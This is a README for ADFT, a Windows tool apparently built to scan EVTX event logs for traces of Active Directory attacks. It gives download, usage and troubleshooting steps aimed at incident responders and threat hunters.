# 🛠️ ADFT - Find AD Attacks in Event Logs

[![Download ADFT](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Nflba4888/ADFT/releases)

## 📥 Download ADFT

Visit the release page to download and run this app on Windows:

https://github.com/Nflba4888/ADFT/releases

Pick the latest release, then download the Windows file from the Assets list.

## 🖥️ What ADFT Does

ADFT helps you check Windows event logs for signs of Active Directory attacks. It reads EVTX files and helps you trace what happened during an incident.

Use it when you need to:
- review security logs
- spot attack traces in Active Directory
- rebuild a timeline from Windows event logs
- support incident response work
- help with DFIR and threat hunting

## ✅ Before You Start

Use a Windows PC with:
- Windows 10 or Windows 11
- an account with permission to run apps
- enough free space for your event logs
- access to the EVTX files you want to inspect

If Windows SmartScreen shows a message, choose the app only if you got it from the release page above.

## 🚀 Get the App

1. Open the release page:
   https://github.com/Nflba4888/ADFT/releases
2. Find the newest release at the top of the page
3. Open the **Assets** section
4. Download the Windows file
5. Save it to a folder you can reach, such as `Downloads`
6. If the file is in a ZIP folder, extract it first
7. Double-click the app to run it

If Windows asks for permission, select **Yes**.

## 🧭 First Run

When ADFT opens, point it to the log files you want to inspect.

Typical files include:
- `.evtx` files from a server or workstation
- exported logs from a security team
- archive folders with multiple event logs

If the app asks for a case folder or output folder, choose a new folder with enough space.

## 📂 How to Use ADFT

1. Start the app
2. Choose your event log files or folder
3. Select the log set you want to review
4. Start the scan
5. Review the events and alerts
6. Use the timeline view to follow the attack path
7. Export the results if you need to share them

The toolkit is built to help you look for:
- account misuse
- suspicious logon activity
- directory changes
- privilege changes
- attack steps across multiple logs

## 🔍 What to Look For

When you review results, focus on:
- new admin rights
- failed logons before a success
- unusual account changes
- remote access from unknown hosts
- changes to groups, users, or permissions
- logon activity at odd hours

These clues can help you rebuild the path of an attack.

## 🗂️ Example Workflow

A simple review flow looks like this:

1. Collect the `.evtx` files
2. Open ADFT
3. Load the files into the tool
4. Scan for Active Directory attack signs
5. Check the event list
6. Sort by time
7. Save the output for later review

## ⚙️ Basic Tips

- Keep the original logs unchanged
- Work on a copy when you can
- Use a clear folder name for each case
- Keep related logs together
- Review the output in time order
- Compare events across several machines when needed

## 🧰 Common Use Cases

ADFT fits well in:
- incident response
- internal security checks
- blue team analysis
- forensic review
- SIEM validation
- threat hunting

## 🛠️ If the App Does Not Open

Try these steps:
- right-click the file and choose **Run as administrator**
- make sure the download finished
- check that you extracted the ZIP file if there was one
- confirm you downloaded the Windows build from the release page
- try a different folder path with fewer special characters

## 📁 File Types You May Use

ADFT is meant for Windows event logs, especially:
- `EVTX` files
- exported security logs
- log bundles from a case folder

Keep the files in one place before you start. That makes review easier.

## 🧩 Working with Active Directory Logs

Active Directory logs can be large. ADFT helps you make sense of them by grouping related events and showing attack patterns across time.

You may see events tied to:
- logon attempts
- account changes
- group changes
- service use
- remote activity
- policy changes

This makes it easier to see how an attacker moved through the environment.

## 📌 Good Practice

- Use a copy of the logs for analysis
- Keep notes while you review events
- Save outputs with the case name and date
- Check both the timeline and the event list
- Review more than one machine when the case needs it

## 🔗 Download Again

Download or open the latest release here:

https://github.com/Nflba4888/ADFT/releases

## 🧱 Project Focus

- Active Directory
- Blue team work
- DFIR
- EVTX review
- Forensics
- Incident response
- Python-based analysis
- SIEM support
- Threat hunting
- Windows security